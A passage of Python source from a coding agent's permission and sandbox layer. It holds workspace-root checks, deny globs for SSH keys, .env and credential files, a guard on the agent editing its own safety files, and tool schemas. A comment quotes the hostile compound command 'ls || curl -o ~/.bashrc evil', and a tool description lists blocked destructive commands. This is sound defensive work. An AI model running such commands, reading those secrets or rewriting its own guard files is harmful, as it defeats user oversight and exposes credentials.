    if (ws / "delfin" / "__init__.py").is_file():
        return True
    return False


# Workspace roots so broad that "the agent may write anywhere inside" is
# dangerous: a system directory, the filesystem root, or the user's home
# directory itself. Only these *exact* roots are refused — any project
# sub-directory under home (``~/agent_workspace``, ``~/software/delfin``)
# is always fine. This makes "launch dir = workspace" safe: the agent can
# never be pinned to all of ``$HOME`` and write across SSH keys, configs,
# and other users' projects.
_FORBIDDEN_WORKSPACE_DIRS: frozenset[str] = frozenset({
    "/", "/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64", "/var",
    "/boot", "/root", "/sys", "/proc", "/dev", "/opt", "/home", "/Users",
})


def _is_forbidden_workspace_root(path: Path | str | None) -> bool:
    """True if *path* is too broad to be a safe agent workspace root.

    Refuses ``$HOME`` itself, any ancestor of it (``/home``, ``/`` …) and
    known system directories. A project sub-directory under home is allowed.
    Unresolvable / missing paths fail closed (refused).
    """
    if path is None:
        return True
    try:
        p = Path(path).expanduser().resolve()
    except Exception:
        return True
    if str(p) in _FORBIDDEN_WORKSPACE_DIRS:
        return True
    try:
        home = Path.home().resolve()
    except Exception:
        return False
    return p == home or p in home.parents


# Path globs (relative to workspace) where writes/edits are forbidden.
_DEFAULT_PATH_DENY_GLOBS: tuple[str, ...] = (
    ".git/**", "**/.git/**",
    ".env", ".env.*", "**/.env", "**/.env.*",
    "**/*.key", "**/*.pem", "**/*.p12", "**/*.pfx",
    "**/.ssh/**", "**/.gnupg/**",
    "**/credentials*", "**/secrets*", "**/*.secret",
    "**/.netrc", "**/.aws/credentials",
)

# Self-modification protection: paths that are still WRITABLE, but always
# require explicit user confirmation — even in 'acceptEdits' or
# 'bypassPermissions' modes. The agent must not silently rewrite its own
# safety layer or the dashboard wiring that hosts the confirmation UI.
_DEFAULT_PATH_PROTECTED_GLOBS: tuple[str, ...] = (
    "delfin/agent/api_client.py",
    "delfin/agent/kit_confirm.py",
    "delfin/agent/engine.py",
    "delfin/dashboard/tab_agent.py",
    # Also guard the rest of the permission/sandbox layer and the persisted
    # config that decides what runs unattended — so a single edit can't widen
    # the agent's own boundaries without an explicit user confirmation.
    "delfin/agent/sandbox.py",
    "delfin/agent/kit_settings.py",
    "delfin/user_settings.py",
    ".delfin/settings.json",
    "**/.delfin/settings.json",
    # CI / repo-governance config. Editing a GitHub Actions workflow can run
    # arbitrary code on the runner or weaken the test gate; CODEOWNERS controls
    # required reviews; dependabot pulls dependencies. A write under .github/
    # therefore needs an explicit confirm, even in acceptEdits — so the agent
    # can't silently poison CI or relax the merge protections of a repo.
    ".github/**",
    "**/.github/**",
)


def _split_shell_segments(cmd: str) -> list[str]:
    """Split a shell command into the segments chained by ``||``, ``&&``,
    ``;``, ``|`` or newline, ignoring operators inside single/double quotes.

    Used so the auto-allow check can require EVERY segment to be safe rather
    than trusting a compound by its first segment. Redirect ``&`` (``2>&1``,
    ``>&``) is preserved — only ``&&`` splits, not a lone ``&`` — so common
    redirects don't fragment a segment. Quoted operators (``grep 'a|b'``) are
    left intact. Empty/whitespace-only segments are dropped.
    """
    segs: list[str] = []
    buf: list[str] = []
    q: str | None = None
    i, n = 0, len(cmd)
    while i < n:
        c = cmd[i]
        if q is not None:
            buf.append(c)
            if c == q:
                q = None
            i += 1
            continue
        if c in ("'", '"'):
            q = c
            buf.append(c)
            i += 1
            continue
        if cmd[i:i + 2] in ("||", "&&"):
            segs.append("".join(buf))
            buf = []
            i += 2
            continue
        if c in (";", "|", "\n"):
            segs.append("".join(buf))
            buf = []
            i += 1
            continue
        buf.append(c)
        i += 1
    segs.append("".join(buf))
    return [s.strip() for s in segs if s.strip()]


@dataclass
class KitToolPermissions:
    """Permission policy for KIT-Toolbox coding-agent tools.

    mode:
        - "plan"               -> read-only (no write/edit/bash)
        - "default"            -> destructive ops require confirm_callback;
                                  bash auto-allow list bypasses callback
        - "acceptEdits"        -> write/edit auto-allowed (sandbox-checked);
                                  bash still gated by callback / auto-allow
        - "bypassPermissions"  -> sandbox + denylist still enforced, but no
                                  user confirmation prompted (use sparingly)
    """

    workspace: Path
    mode: str = "default"
    # The active agent role from the engine — used to gate the tool
    # surface (e.g. dashboard_agent gets a read-only allow-list).
    # Empty string means "no role-based filtering".
    agent_role: str = ""
    # Dashboard / UI session that owns the current task list. Empty means
    # "no active session-scoped task filter".
    task_session_id: str = ""
    # Sub-agent nesting depth (0 = the top-level agent). _derive_perms bumps it
    # per child so a delegated agent can't recursively fan out sub-agents.
    subagent_depth: int = 0
    bash_deny_patterns: tuple[str, ...] = _DEFAULT_BASH_DENY_PATTERNS
    bash_auto_allow_patterns: tuple[str, ...] = _DEFAULT_BASH_AUTO_ALLOW
    path_deny_globs: tuple[str, ...] = _DEFAULT_PATH_DENY_GLOBS
    path_protected_globs: tuple[str, ...] = _DEFAULT_PATH_PROTECTED_GLOBS
    extra_workspace_dirs: tuple[Path, ...] = ()
    # Reachable but NOT freely writable — protects valuable data:
    #   read_only_workspace_dirs — reads allowed, writes HARD-denied (archive of
    #     stored calculations; the DELFIN checkout when you didn't launch there).
    #   confirm_write_dirs       — reads allowed, writes require an explicit
    #     confirm even in acceptEdits (calc: edit a stored calculation only on
    #     confirmation, so the agent can't silently destroy results).
    read_only_workspace_dirs: tuple[Path, ...] = ()
    confirm_write_dirs: tuple[Path, ...] = ()
    bash_timeout_s: int = 120
    bash_max_timeout_s: int = 600
    max_output_chars: int = 12_000
    confirm_callback: Optional[Callable[[str, dict, str], bool]] = None
    pre_tool_hook: Optional[Callable[[str, dict], None]] = None
    post_tool_hook: Optional[Callable[[str, dict, str], None]] = None
    # Structured-question UI binding. Receives the full ask_user_question
    # arguments dict and must return a dict with at least {"answers": [...]}.
    # When None, calls to ``ask_user_question`` return a not-available
    # error to the model so it falls back to plain-prose questions.
    ask_user_callback: Optional[Callable[[dict], dict]] = None
    # Plan-approval callback: receives the plan markdown the agent
    # submitted via ``exit_plan_mode`` and must return a dict::
    #   {"approved": bool, "new_mode": "default"|"acceptEdits"|"bypassPermissions"}
    # When None, the executor records the plan locally and switches
    # to "default" mode silently — useful for tests/headless runs.
    plan_approval_callback: Optional[Callable[[str], dict]] = None
    last_approved_plan: str = ""
    # Sub-agent runner: set by OpenAIClient on attach so the
    # ``subagent`` tool can fire a child loop without _DocToolExecutor
    # holding a back-reference to the client. Signature:
    #   (subagent_type: str, description: str, prompt: str) -> dict payload
    subagent_runner: Optional[Callable[..., dict]] = None
    read_tracker: dict[str, float] = field(default_factory=dict)

    def __post_init__(self) -> None:
        self.workspace = Path(self.workspace).expanduser().resolve()
        # Security: never let the agent be pinned to $HOME or a system root.
        # "launch dir = workspace" is only safe because this floor holds — a
        # too-broad workspace would let writes/bash reach SSH keys, configs and
        # other users' files. Project sub-dirs (~/agent_workspace) are fine.
        if _is_forbidden_workspace_root(self.workspace):
            raise ValueError(
                f"Refusing {self.workspace} as the agent workspace — it is your "
                "home directory or a system root, which would let the agent "
                "write anywhere. Launch from a project sub-directory instead "
                "(e.g. ~/agent_workspace)."
            )
        valid = {"plan", "default", "acceptEdits", "bypassPermissions"}
        if self.mode not in valid:
            raise ValueError(f"mode must be one of {valid}, got {self.mode!r}")
        resolved_extra: list[Path] = []
        for d in self.extra_workspace_dirs or ():
            try:
                p = Path(d).expanduser().resolve()
            except Exception:
                continue
            if p == self.workspace:
                continue
            # Same floor for extra writable roots — drop forbidden ones
            # silently rather than fail the whole engine build.
            if _is_forbidden_workspace_root(p):
                continue
            if p not in resolved_extra:
                resolved_extra.append(p)
        self.extra_workspace_dirs = tuple(resolved_extra)

        def _resolve_dirs(dirs, *, drop_writable: bool) -> tuple:
            out: list[Path] = []
            for d in dirs or ():
                try:
                    p = Path(d).expanduser().resolve()
                except Exception:
                    continue
                if _is_forbidden_workspace_root(p):
                    continue
                # READ-ONLY dirs must NOT double as writable — writable wins
                # (e.g. the delfin checkout when you launched there). CONFIRM
                # dirs (calc) intentionally ARE writable roots too, so they keep
                # their confirm marker even though they're in extra_workspace_dirs.
                if drop_writable and (
                    p == self.workspace or p in self.extra_workspace_dirs):
                    continue
                if p not in out:
                    out.append(p)
            return tuple(out)
        self.read_only_workspace_dirs = _resolve_dirs(
            self.read_only_workspace_dirs, drop_writable=True)
        self.confirm_write_dirs = _resolve_dirs(
            self.confirm_write_dirs, drop_writable=False)
        self.is_delfin_workspace = _is_delfin_workspace(self.workspace)
        # Merge in DELFIN-only bash patterns only inside the DELFIN repo so
        # generic projects don't get an auto-allowed ``xtb`` / ``delfin``
        # surface they never asked for. Only extends the default tuple —
        # callers who passed a custom tuple are respected as-is.
        if (
            self.is_delfin_workspace
            and self.bash_auto_allow_patterns is _DEFAULT_BASH_AUTO_ALLOW
        ):
            self.bash_auto_allow_patterns = (
                _DEFAULT_BASH_AUTO_ALLOW + _DELFIN_BASH_AUTO_ALLOW
            )

    def all_workspace_roots(self) -> tuple[Path, ...]:
        return (self.workspace,) + tuple(self.extra_workspace_dirs)

    def add_extra_dir(self, path) -> Path:
        """Add ``path`` to the allowed workspace roots.

        Returns the resolved path. Raises ValueError if the path does not
        exist or is not a directory. Idempotent: re-adding is a no-op.
        """
        p = Path(path).expanduser().resolve()
        if not p.exists():
            raise ValueError(f"path does not exist: {p}")
        if not p.is_dir():
            raise ValueError(f"path is not a directory: {p}")
        if p == self.workspace or p in self.extra_workspace_dirs:
            return p
        self.extra_workspace_dirs = tuple(self.extra_workspace_dirs) + (p,)
        return p

    def find_root_for(self, resolved: Path) -> Optional[Path]:
        """Return the WRITABLE workspace root that contains ``resolved``, or None."""
        for root in self.all_workspace_roots():
            try:
                resolved.relative_to(root)
                return root
            except ValueError:
                continue
        return None

    @staticmethod
    def _under_any(resolved: Path, roots) -> bool:
        for root in roots:
            try:
                resolved.relative_to(root)
                return True
            except ValueError:
                continue
        return False

    def all_readable_roots(self) -> tuple[Path, ...]:
        """Roots the agent may READ from: writable + read-only + confirm-write."""
        return (self.all_workspace_roots()
                + tuple(self.read_only_workspace_dirs)
                + tuple(self.confirm_write_dirs))

    def find_readable_root_for(self, resolved: Path) -> Optional[Path]:
        """Return any reachable (readable) root containing ``resolved``, or None."""
        for root in self.all_readable_roots():
            try:
                resolved.relative_to(root)
                return root
            except ValueError:
                continue
        return None

    def is_read_only_path(self, resolved: Path) -> bool:
        """True if a WRITE here must be hard-denied (archive / delfin checkout).
        A path also under a writable root is NOT read-only (writable wins — e.g.
        the delfin checkout when you launched there is the writable workspace)."""
        if self.find_root_for(resolved) is not None:
            return False
        return self._under_any(resolved, self.read_only_workspace_dirs)

    def is_confirm_write_path(self, resolved: Path) -> bool:
        """True if a WRITE here must go through an explicit confirm (calc).
        calc is a WRITABLE root (so the executor can write after confirm) AND a
        confirm dir — so this does NOT exclude writable paths."""
        return self._under_any(resolved, self.confirm_write_dirs)

    def matches_path_deny(self, rel_path: str) -> bool:
        rp = rel_path.replace("\\", "/")
        return any(fnmatch.fnmatch(rp, g) for g in self.path_deny_globs)

    def matches_path_protected(self, rel_path: str) -> bool:
        """Self-modification guard: paths that always require explicit confirm,
        even in 'acceptEdits' or 'bypassPermissions'. Used for the agent's own
        safety layer (api_client.py, kit_confirm.py, engine.py, tab_agent.py)."""
        rp = rel_path.replace("\\", "/")
        return any(fnmatch.fnmatch(rp, g) for g in self.path_protected_globs)

    def matches_bash_deny(self, cmd: str) -> Optional[str]:
        for pat in self.bash_deny_patterns:
            if re.search(pat, cmd, re.IGNORECASE):
                return pat
        return None

    def matches_bash_auto_allow(self, cmd: str) -> bool:
        # A command is auto-allowed only if EVERY shell segment is individually
        # auto-allowed. Start-anchored patterns alone would trust a compound by
        # its first (safe) segment — e.g. ``ls || curl -o ~/.bashrc evil`` —
        # leaving the dangerous tail to the deny-list as the sole backstop. By
        # requiring all of ``a || b``, ``a && b``, ``a ; b``, ``a | b`` to
        # match, a mixed compound falls through to the gate, while an all-safe
        # compound (``python3.10 --version || which python3.10 || echo nf``)
        # still runs unattended.
        segments = _split_shell_segments(cmd)
        if not segments:
            return False
        return all(self._segment_auto_allowed(s) for s in segments)

    def _segment_auto_allowed(self, cmd: str) -> bool:
        for pat in self.bash_auto_allow_patterns:
            if re.search(pat, cmd, re.IGNORECASE):
                return True
        # Workspace-local virtualenv tool invocations are safe to
        # auto-allow in default mode because sandboxing still confines
        # them to the allowed roots. Support both hidden `.venv-*` and
        # plain `venv-*` names, under ANY path prefix — bare (`.venv/bin/pip`),
        # absolute, `~`, OR a relative subdir (`app/.venv/bin/pip`). The last
        # form was previously rejected, so an agent that built its venv in a
        # subdir got `pip install` blocked (bug 2026-06-25: Tetris/voila task).
        _tool = (
            r"(?:pip|python(?:\d(?:\.\d+)?)?|pytest|ruff|black|isort|mypy|"
            r"coverage|sphinx-build|pyflakes|flake8|tox|jupyter|ipython|voila)"
        )
        _m_rel = re.match(
            rf"^\s*((?:\.?venv)[\w.-]*/bin/{_tool})\b", cmd, re.IGNORECASE
        )
        _m_abs = re.match(
            rf"^\s*([^\s]*/(?:\.?venv)[\w.-]*/bin/{_tool})\b",
            cmd, re.IGNORECASE,
        )
        candidate = None
        if _m_rel:
            candidate = (self.workspace / _m_rel.group(1)).resolve(strict=False)
        elif _m_abs:
            p = _m_abs.group(1)
            if p.startswith("~") or p.startswith("/"):
                candidate = Path(p).expanduser().resolve(strict=False)
            else:
                # relative path with a subdir prefix (app/.venv/bin/pip): resolve
                # against the WORKSPACE, not the process cwd, then containment-check.
                candidate = (self.workspace / p).resolve(strict=False)
        if candidate is not None and self.find_root_for(candidate) is not None:
            return True
        return False


def _default_kit_permissions(cwd: Optional[Path] = None) -> KitToolPermissions:
    """Conservative defaults: workspace = cwd, mode = 'default'."""
    return KitToolPermissions(workspace=Path(cwd or Path.cwd()))


# ---------------------------------------------------------------------------
# Local doc-search tools (function calling for non-CLI backends)
# ---------------------------------------------------------------------------

_DOC_TOOLS_OPENAI: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "search_docs",
            "description": (
                "Search indexed documentation (ORCA manual, xTB docs, papers) "
                "for sections matching a query.  Returns JSON with doc_id, "
                "section_id, title, score, and snippet."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Free-text search query (e.g. 'relaxed surface scan', 'RIJCOSX')",
                    },
                    "doc_filter": {
                        "type": "string",
                        "description": "Optional: restrict to a specific doc_id",
                    },
                    "max_results": {
                        "type": "integer",
                        "description": "Max results to return (default 10)",
                    },
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "read_section",
            "description": (
                "Read the full text of a specific section from an indexed document. "
                "Use after search_docs to read a section in detail."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "doc_id": {
                        "type": "string",
                        "description": "Document identifier (from search_docs results)",
                    },
                    "section_id": {
                        "type": "string",
                        "description": "Section identifier (from search_docs results)",
                    },
                },
                "required": ["doc_id", "section_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_docs",
            "description": "List all indexed documents with doc_id, title, section_count.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_sections",
            "description": "List all sections (table of contents) of a specific document.",
            "parameters": {
                "type": "object",
                "properties": {
                    "doc_id": {
                        "type": "string",
                        "description": "Document identifier (from list_docs)",
                    },
                },
                "required": ["doc_id"],
            },
        },
    },
    # -- Calculation search tools --
    {
        "type": "function",
        "function": {
            "name": "search_calcs",
            "description": (
                "Search DELFIN calculations across calc/, archive/, and remote_archive/. "
                "Find calculations by keyword (method, basis set, solvent, molecule name) "
                "or structured filters. Returns matching calculations with metadata."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Free-text keyword query (e.g. 'PBE0 def2-TZVP', 'TDDFT toluene')",
                    },
                    "source": {
                        "type": "string",
                        "description": "Filter by source: 'calc', 'archive', or 'remote_archive'",
                    },
                    "functional": {
                        "type": "string",
                        "description": "Filter by DFT functional (e.g. 'PBE0', 'B3LYP', 'CAM-B3LYP')",
                    },
                    "basis_set": {
                        "type": "string",
                        "description": "Filter by basis set (e.g. 'def2-TZVP', 'ma-def2-TZVP')",
                    },
                    "solvent": {
                        "type": "string",
                        "description": "Filter by solvent (e.g. 'toluene', 'DMF', 'chcl3')",
                    },
                    "module": {
                        "type": "string",
                        "description": "Filter by DELFIN module (e.g. 'ESD', 'GUPPY', 'IMAG', 'OCCUPIER')",
                    },
                    "max_results": {
                        "type": "integer",
                        "description": "Max results to return (default 20)",
                    },
                },
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_calc_info",
            "description": (
                "Get detailed information about a specific calculation by name. "
                "Returns functional, basis set, solvent, charge, SMILES, energies, "
                "modules, output files, completion status, and more."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "calc_id": {
                        "type": "string",
                        "description": "Calculation name or ID (e.g. 'Emitter8_CAMB3LYP_ma-def2-TZVP')",
                    },
                },
                "required": ["calc_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "calc_summary",
            "description": (
                "Get a summary of all indexed calculations: total count, breakdown by source, "
                "most-used functionals, basis sets, solvents, and DELFIN modules."
            ),
            "parameters": {"type": "object", "properties": {}},
        },
    },
    # -- Repo file access tools (for providers without CLI subprocess) --
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": (
                "Read a file. Accepts BOTH a workspace-relative path "
                "(e.g. 'delfin/agent/foo.py') AND an absolute path "
                "(e.g. '/home/user/project/foo.py'). When the user is "
                "working in an extra_workspace_dir (granted via the "
                "'Erlaubte Verzeichnisse' panel or remember_permission), "
                "ALWAYS use the absolute path — relative paths only ever "
                "resolve against the primary workspace root and will look "
                "in the wrong place. Returns file content. Secret-deny "
                "globs (.ssh/, .env, *.key, credentials, *.pem) are "
                "always refused, even with a callback."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "File path. Workspace-relative (e.g. "
                            "'delfin/agent/foo.py') OR absolute (e.g. "
                            "'/home/user/TestOpt/Simulation/foo.py'). "
                            "Use the absolute form for any file outside "
                            "the primary workspace."
                        ),
                    },
                    "offset": {
                        "type": "integer",
                        "description": "Start reading from this line number (0-based). Optional.",
                    },
                    "limit": {
                        "type": "integer",
                        "description": "Maximum number of lines to read. Optional, default 200.",
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "view_image",
            "description": (
                "LOOK AT an image file (PNG/JPEG/WebP/GIF) — the image is "
                "shown to you (the vision model) so you can actually SEE and "
                "describe its visual content: plots, screenshots, diagrams, "
                "molecular renders, photos. Use this for images instead of "
                "read_file (which only reads text and would return garbage on "
                "a PNG). Accepts a workspace-relative or absolute path."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "Path to the image file. Workspace-relative "
                            "(e.g. 'plots/spectrum.png') OR absolute."
                        ),
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remember",
            "description": (
                "Save a DURABLE fact to persistent project memory — it is "
                "recalled automatically at the start of future sessions, so use "
                "it proactively the moment you learn something worth keeping "
                "(don't make the user repeat themselves). type='user' (who they "
                "are / preferences), 'feedback' (how to work — a correction or "
                "confirmed approach; add why + how-to-apply), 'project' (an "
                "ongoing goal/decision/constraint NOT in the code or git), "
                "'reference' (an external URL/ticket). Do NOT save transient "
                "task details, secrets, or anything already in the code / "
                "CLAUDE.md / git. One fact per memory; before saving, prefer "
                "updating a similar existing memory over duplicating it; link "
                "related ones in the text with [[their-slug]]."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "text": {
                        "type": "string",
                        "description": (
                            "The fact to remember (one fact). For feedback/"
                            "project, follow with why + how to apply it."
                        ),
                    },
                    "type": {
                        "type": "string",
                        "enum": ["user", "feedback", "project", "reference"],
                        "description": "Memory type (default 'project').",
                    },
                    "title": {
                        "type": "string",
                        "description": "Optional short title; auto-derived if omitted.",
                    },
                },
                "required": ["text"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "grep_file",
            "description": (
                "Search for a regex pattern in files under the DELFIN repository. "
                "Returns matching lines with file paths and line numbers."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {
                        "type": "string",
                        "description": "Regex pattern to search for",
                    },
                    "path": {
                        "type": "string",
                        "description": "File or directory to search in (relative to repo root). Default: entire repo.",
                    },
                    "max_results": {
                        "type": "integer",
                        "description": "Maximum number of matching lines to return (default 30)",
                    },
                },
                "required": ["pattern"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_files",
            "description": (
                "List files matching a glob pattern in the DELFIN repository. "
                "Returns file paths sorted by modification time."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {
                        "type": "string",
                        "description": "Glob pattern (e.g. 'delfin/agent/*.py', 'tests/test_*.py')",
                    },
                },
                "required": ["pattern"],
            },
        },
    },
    # -- Coding-agent tools (sandbox + permission-gated) --
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": (
                "Create a new file or fully overwrite an existing file. "
                "Path may be workspace-relative OR an absolute path inside "
                "any allowed workspace root (workspace + extra_workspace_dirs). "
                "When working in a user-granted directory like "
                "/home/<user>/<project>, USE THE ABSOLUTE PATH — relative "
                "paths only resolve against the primary workspace. For "
                "existing files, call read_file first. Returns a unified "
                "diff. Use edit_file for partial changes."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "File path. Workspace-relative OR absolute (when "
                            "the target lives in an extra_workspace_dir, e.g. "
                            "'/home/user/TestOpt/Simulation/foo.py')."
                        ),
                    },
                    "content": {
                        "type": "string",
                        "description": "Full file content to write.",
                    },
                },
                "required": ["path", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "edit_file",
            "description": (
                "Replace an exact substring in a file. The file must have been "
                "read with read_file before editing. old_string must match "
                "EXACTLY once unless replace_all=true. Returns a unified diff. "
                "Preserve indentation exactly as shown in read_file output "
                "(strip the line-number prefix, keep leading whitespace). "
                "If the exact match fails, a whitespace-tolerant fallback "
                "tries again (re-indents new_string to match the file). "
                "When the fallback engages, the success message says "
                "'fuzzy match' — re-read and copy the block verbatim next time."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "File path. Workspace-relative OR absolute "
                            "(use absolute when the file is in an "
                            "extra_workspace_dir like /home/user/project)."
                        ),
                    },
                    "old_string": {
                        "type": "string",
                        "description": "Exact substring to replace. Include enough context for uniqueness.",
                    },
                    "new_string": {
                        "type": "string",
                        "description": "Replacement text. Must differ from old_string.",
                    },
                    "replace_all": {
                        "type": "boolean",
                        "description": "Replace every occurrence (default false).",
                    },
                },
                "required": ["path", "old_string", "new_string"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "multi_edit",
            "description": (
                "Apply a sequence of edits to a single file atomically. Each edit "
                "is an object with old_string, new_string, and optional replace_all. "
                "Edits run in order against the file's current text; if any edit "
                "fails (no match, ambiguous match, identical strings) NOTHING is "
                "written. The file must have been read with read_file first. "
                "Use this for refactors that touch several spots in one file."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "File path. Workspace-relative OR absolute "
                            "(use absolute when the file is in an "
                            "extra_workspace_dir like /home/user/project)."
                        ),
                    },
                    "edits": {
                        "type": "array",
                        "description": "Ordered list of edits to apply.",
                        "items": {
                            "type": "object",
                            "properties": {
                                "old_string": {"type": "string"},
                                "new_string": {"type": "string"},
                                "replace_all": {"type": "boolean"},
                            },
                            "required": ["old_string", "new_string"],
                        },
                    },
                },
                "required": ["path", "edits"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remember_permission",
            "description": (
                "Persist a KIT-Toolbox permission rule to ~/.delfin/settings.json "
                "(or <repo>/.delfin/settings.json with scope='repo'). Mirrors the "
                "the 'always allow X' pattern — once stored, matching "
                "actions in future sessions skip the user-confirm dialog. "
                "ALWAYS confirm with the user before calling this; the user can "
                "still revoke afterwards by editing the JSON file. "
                "kind='allow_pattern' / 'deny_pattern' append a regex to the "
                "Bash auto-allow / deny list. kind='extra_dir' adds a workspace "
                "root. kind='default_mode' sets the persisted permission mode."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "kind": {
                        "type": "string",
                        "enum": ["allow_pattern", "deny_pattern",
                                 "extra_dir", "default_mode"],
                        "description": "What to persist.",
                    },
                    "value": {
                        "type": "string",
                        "description": (
                            "For allow_pattern/deny_pattern: a Python regex "
                            "(e.g. '^\\\\s*pytest\\\\b'). For extra_dir: an "
                            "absolute path. For default_mode: one of 'plan', "
                            "'default', 'acceptEdits', 'bypassPermissions'."
                        ),
                    },
                    "scope": {
                        "type": "string",
                        "enum": ["user", "repo"],
                        "description": (
                            "user (default) -> ~/.delfin/settings.json. "
                            "repo -> <repo>/.delfin/settings.json."
                        ),
                    },
                    "rationale": {
                        "type": "string",
                        "description": "One-line justification shown to the user.",
                    },
                },
                "required": ["kind", "value", "rationale"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remember_permission_bundle",
            "description": (
                "One-shot setup for a typical project: persist an "
                "extra_workspace_dir AND the bash auto-allow patterns the "
                "agent needs to actually develop in it (create venv, "
                "pip install, run scripts, run tests). All persistence is "
                "atomic — user gets a SINGLE confirm dialog listing every "
                "rule about to be written. Use when the user says things "
                "like 'arbeite immer in /pfad' or 'integriere meine "
                "optimizer in projektX'. Profile 'project_dev' allows: "
                "'python -m venv ...', '<dir>/.venv-*/bin/pip install', "
                "'<dir>/.venv-*/bin/python', 'pytest', 'ruff', 'mypy'. "
                "ALWAYS state in chat what you are about to add before "
                "calling this."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "profile": {
                        "type": "string",
                        "enum": ["project_dev"],
                        "description": (
                            "Bundle preset. 'project_dev' is the only "
                            "profile so far — venv + pip + python + "
                            "pytest + ruff + mypy."
                        ),
                    },
                    "directory": {
                        "type": "string",
                        "description": (
                            "Absolute path to the project. Becomes an "
                            "extra_workspace_dir; venv allow-patterns "
                            "are scoped to subdirs of this path."
                        ),
                    },
                    "scope": {
                        "type": "string",
                        "enum": ["user", "repo"],
                        "description": (
                            "Default 'repo' — writes to "
                            "<directory>/.delfin/settings.json so the "
                            "rules travel with the project."
                        ),
                    },
                    "rationale": {
                        "type": "string",
                        "description": "One-line justification (e.g. 'enable Bayesian-opt project workflow').",
                    },
                },
                "required": ["profile", "directory", "rationale"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash",
            "description": (
                "Execute a shell command inside the workspace. The command runs "
                "with a configurable timeout and returns stdout+stderr (truncated). "
                "Destructive patterns (rm -rf, dd, sudo, force-push, reset --hard, "
                "fork bombs, pipe-to-shell, etc.) are rejected. Always include a "
                "short description so the user can audit. For long-running tasks, "
                "raise timeout_s; do not use background loops or sleep-polling."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Shell command (passed to /bin/bash -c).",
                    },
                    "description": {
                        "type": "string",
                        "description": "One-line description of what the command does (5-12 words).",
                    },
                    "timeout_s": {
                        "type": "integer",
                        "description": "Timeout in seconds (default 120, max 600).",
                    },
                    "cwd": {
                        "type": "string",
                        "description": (
                            "Working directory for the command. Accepts a "
                            "workspace-relative path OR an absolute path that "
                            "lives under one of the allowed roots (workspace + "
                            "extra_workspace_dirs). ALWAYS use this parameter "
                            "to enter another directory — never prepend "
                            "`cd /path &&` to the command, that defeats the "
                            "auto-allow gate. Defaults to the workspace root."
                        ),
                    },
                },
                "required": ["command", "description"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash_background",
            "description": (
                "Start a long-running shell command and return a job_id "
                "IMMEDIATELY without waiting for completion. Use this for "
                "Bayesian-opt runs, training loops, large pytest sessions, "
                "or any command expected to take longer than ~60s. The "
                "command runs through the SAME safety gate as bash "
                "(workspace sandbox, deny-list, secret scanner, "
                "auto-allow patterns). Output is streamed to tempfiles; "
                "read incrementally with bash_output(job_id). Wait for "
                "completion with bash_status(job_id, wait_seconds=300) — "
                "do NOT poll bash_status in a tight loop. Stop with "
                "bash_kill(job_id). Hard timeout 24h."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Shell command (passed to /bin/bash -c).",
                    },
                    "description": {
                        "type": "string",
                        "description": "One-line description of what the command does.",
                    },
                    "cwd": {
                        "type": "string",
                        "description": (
                            "Working directory (workspace-relative or "
                            "absolute under an allowed root). Defaults to "
                            "the workspace."
                        ),
                    },
                    "timeout_s": {
                        "type": "integer",
                        "description": (
                            "Hard kill timeout in seconds. Default 86400 "
                            "(24h). The command is SIGTERM'd at the "
                            "deadline, then SIGKILL'd."
                        ),
                    },
                },
                "required": ["command", "description"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash_status",
            "description": (
                "Check the status of a background bash job. Returns "
                "running flag, exit_code (None while running), elapsed "
                "seconds, the command, and the cwd. Use AFTER "
                "bash_background to know when the job has finished.\n"
                "To WAIT for a long job (e.g. a ~10-min benchmark) pass "
                "wait_seconds: this BLOCKS until the job finishes or that "
                "many seconds elapse (capped at 300s/call), then returns. "
                "Do NOT poll in a tight loop every few seconds — that "
                "burns the tool-round budget long before the job is done. "
                "Instead call once with e.g. wait_seconds=300; if it is "
                "still running, call again. (If you do re-check a running "
                "job without wait_seconds, the call auto-throttles so a "
                "tight loop can't exhaust the budget.)"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "job_id": {
                        "type": "string",
                        "description": "ID returned by bash_background.",
                    },
